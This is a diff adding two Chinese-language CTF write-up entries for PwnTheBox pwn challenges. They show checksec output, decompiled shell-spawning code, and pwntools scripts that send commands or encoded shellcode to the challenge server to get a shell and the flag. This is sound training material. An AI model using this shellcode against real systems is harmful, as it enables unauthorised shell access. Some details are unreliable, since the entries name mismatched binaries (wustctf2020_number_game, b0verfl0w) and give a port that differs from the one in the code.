@@ -1944,6 +1944,62 @@ io.interactive()
 
 ## PwnTheBox
 
+### [others shellcode](https://ce.pwnthebox.com/challenges?id=476)
+
+先`file ./wustctf2020_number_game  `查看文件类型，再`checksec --file=./wustctf2020_number_game  `检查一下文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ file ./shell_asm                                                                         
+./shell_asm: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c1e8d8e26946c6b08794abdad991e3909e1bdc7f, not stripped
+                                                                                                    
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ checksec --file=./shell_asm                                                    
+[*] '/home/tyd/ctf/pwn/pwnthebox/shell_asm'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+使用`IDA pro 32bit`打开附件`b0verfl0w`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  getShell();
+  return 0;
+}
+```
+
+双击`getShell()`函数查看详情：
+
+```c
+int getShell()
+{
+  int result; // eax
+  char v1[9]; // [esp-Ch] [ebp-Ch] BYREF
+
+  strcpy(v1, "/bin//sh");
+  result = 11;
+  __asm { int     80h; LINUX - sys_execve }
+  return result;
+}
+```
+
+直接`nc redirect.do-not-trust.hacking.run 10131`进靶机，`cat flag`拿到`PTB{4dc758b3-31e2-434d-af1a-bfc082c51671}`。当然也可以用`pwntools`练习，编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10131`，发送`payload`即可得到`PTB{4dc758b3-31e2-434d-af1a-bfc082c51671}`，提交即可。
+
+```python
+from pwn import *
+
+io = remote('redirect.do-not-trust.hacking.run', 10131)
+io.sendline(b'cat flag')
+io.interactive()
+```
+
+------
+
 ### [tutorial1](https://ce.pwnthebox.com/challenges?type=4&id=948)
 
 先`file ./tutorial1`查看文件类型再`checksec --file=./tutorial1`检查了一下文件保护情况。
@@ -3231,6 +3287,25 @@ io.interactive()
 ```
 
 ------
+
+### [Shell 黑客 2](https://ce.pwnthebox.com/challenges?id=1008)
+
+题目没有附件，`nc redirect.do-not-trust.hacking.run 10168`可以输入但是没有回显。结合题目描述：
+
+> 你知道什么是 shellcode 吗？也许这可以帮助你了解更多！
+
+直接`asm(shellcraft.sh())`来执行`system("/bin/sh")`获取靶机`shell`权限。编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10021`，发送`payload`即可得到`PTB{9c4fe944-0fdc-497a-ad2a-05e609bc4a3d}`，提交即可。
+
+```python
+from pwn import *
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('redirect.do-not-trust.hacking.run', 10168)
+shellcode = b'PYVTX10X41PZ41H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE2O0Z2G7O1E7M04KO1P0S2L0Y3T3CKL0J0N000Q5A1W66MN0Y0X021U9J622A0H1Y0K3A7O5I3A114CKO0J1Y4Z5F06'
+io.send(shellcode)
+io.interactive()
+```
+
+
 
 ## Pwnable.kr
 
